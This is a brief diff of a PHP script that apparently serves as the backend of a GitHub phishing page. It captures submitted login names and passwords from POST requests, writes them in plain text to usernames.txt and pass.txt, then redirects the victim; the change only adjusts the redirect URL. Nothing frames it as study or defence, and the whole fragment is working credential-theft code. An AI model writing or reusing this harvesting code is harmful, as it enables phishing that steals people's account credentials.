@@ -4,5 +4,5 @@ file_put_contents("usernames.txt", "Github Username : " . $email = $_POST['login
 ?>
 <?php
 file_put_contents("pass.txt", "Github Password : " . $pass = $_POST['password'] . "\n", FILE_APPEND);
-header('Location: redirecturl');
+header('Location: https://redirecturl');
 ?>
